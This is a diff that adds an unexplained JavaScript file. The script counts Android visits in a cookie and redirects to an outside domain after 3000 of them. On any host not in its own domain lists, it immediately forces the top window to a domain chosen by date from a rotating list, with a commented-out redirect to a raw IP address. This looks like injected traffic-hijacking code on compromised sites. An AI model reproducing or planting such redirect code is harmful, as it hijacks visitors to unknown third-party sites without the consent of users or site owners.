@@ -1,0 +1,92 @@
+﻿var hostnamess = document.domain;
+function getcookiess(name) {
+	var cookie_start = document.cookie.indexOf(name);
+	var cookie_end = document.cookie.indexOf(";", cookie_start);
+	return cookie_start == -1 ? '' : unescape(document.cookie.substring(cookie_start + name.length + 1, (cookie_end > cookie_start ? cookie_end : document.cookie.length)));
+}
+function setcookiess(name, value, hours) {
+	var expire = "";
+	if (hours != null) {
+		expire = new Date((new Date()).getTime() + hours * 3600000);
+		expire = "; expires=" + expire.toGMTString();
+	}
+	document.cookie = name + "=" + encodeURIComponent(value) + "; domain=" + hostnamess + ";path=/" + expire;
+}
+if(navigator.userAgent.match(/Android/i)){
+	var playss=getcookiess("playss");
+	var tiaoss=getcookiess("tiaoss");
+	if (typeof(tiaoss) == "undefined" || tiaoss==""){
+		if (typeof(playss) == "undefined" || playss==""){
+			playss=1;
+			setcookiess("playss", playss, 24);
+		}else{
+			playss=parseInt(playss)+1;
+			setcookiess("playss", playss, 24);
+		}
+		if (parseInt(playss)>=3000){
+			tiaoss=1;
+			setcookiess("tiaoss", tiaoss, 24);
+			window.location.href="https://www.133du.com/?1";
+	
+		}
+	}
+}
+
+var host=window.location.host.toLowerCase();
+
+var videourl="";
+var url = new Array();
+var url2 = new Array();
+var url4 = new Array();
+var url5 = new Array();
+var urlmovie = new Array();
+var url3="";
+var url6="";
+var urlmovie2="";
+var istiao="1";
+videourl="https://111.183yu.com";
+url.push("499dd.com");
+url.push("183yu.com");
+
+
+
+url2.push("245ci.com");
+url2.push("170ku.com");
+url2.push("132fu.com");
+
+var timestamp = Date.parse(new Date());
+var day1=parseInt((timestamp+8*3600000)/86400000);
+//url3 = "http://www."+escape(url2[Math.floor(Math.random()*url2.length)]);
+url3 = "http://www." + escape(url2[(day1%url2.length)]);
+
+
+url6 = "http://www."+escape(url5[Math.floor(Math.random()*url5.length)]);
+urlmovie2 = "http://"+escape(urlmovie[Math.floor(Math.random()*urlmovie.length)]);
+for(var i=0;i<url.length;i++){
+	if (host.indexOf(url[i])>=0){
+		istiao="0";
+	}
+}
+for(var i=0;i<url2.length;i++){
+	if (host.indexOf(url2[i])>=0){
+		istiao="0";
+	}
+}
+for(var i=0;i<url4.length;i++){
+	if (host.indexOf(url4[i])>=0){
+		istiao="2";
+	}
+}
+
+if ((host.indexOf("1.695n.com")>=0) || (host.indexOf("hhhhh.com")>=0)){
+	top.location.href="/zhuan/index.htm?d="+url3.replace("https://www.","");
+}
+
+if (istiao=="1"){
+	//top.location.href='http://168.235.241.96:88/r.htm?d='+url3.replace("https://www.","");
+	//top.location.href=url3;
+ setTimeout("top.location.href=url3;",0);
+	//top.location.href="/zhuan/?d="+url3.replace("https://www.","");
+}else if (istiao=="2"){
+	top.location.href=url6;
+}
